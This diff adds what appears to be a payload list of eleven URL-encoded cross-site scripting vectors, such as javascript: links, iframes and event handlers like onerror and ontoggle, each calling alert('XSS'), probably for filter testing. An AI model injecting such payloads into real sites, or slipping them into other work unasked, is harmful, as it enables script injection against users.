@@ -1,0 +1,11 @@
+%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C%2Fa%3E
+%3Cimg%20src%3D%22http%3A%2F%2Fattacker.com%2Fevil.png%22%20onerror%3D%22alert%28%27XSS%27%29%22%3E
+%3Cinput%20value%3D%22%22%20onfocus%3D%22alert%28%27XSS%27%29%22%3E
+%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2Fiframe%3E
+%3Csvg%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%2Fsvg%3E
+%3Cbody%20onload%3D%22alert%28%27XSS%27%29%22%3E%3C%2Fbody%3E
+%3Cbody%20onload%3D%22alert%28%27XSS%27%29%22%3E%3C%2Fbody%3E
+%3Cobject%20data%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2Fobject%3E
+%3Cdetails%20open%20ontoggle%3D%22alert%28%27XSS%27%29%22%3E%3C%2Fdetails%3E
+%3Cmarquee%20onstart%3D%22alert%28%27XSS%27%29%22%3EXSS%20Test%3C%2Fmarquee%3E
+%3Cvideo%20src%20onerror%3D%22alert%28%27XSS%27%29%22%3E%3C%2Fvideo%3E
